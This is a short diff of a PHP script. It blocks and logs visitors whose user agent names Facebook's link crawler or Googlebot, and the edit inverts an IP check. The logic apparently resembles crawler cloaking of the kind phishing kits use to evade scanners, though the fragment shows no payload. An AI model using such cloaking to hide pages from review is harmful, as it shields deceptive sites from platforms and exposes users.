@@ -303,7 +303,7 @@ $ip =  $_SERVER[\'REMOTE_ADDR\'];
 // $country = $details->country;
 if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
- strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || ! checkIP($ip)
+ strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
 ) {
   $fAgent = fopen($text, \'a\');
   $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] .\' blocked \' . PHP_EOL;
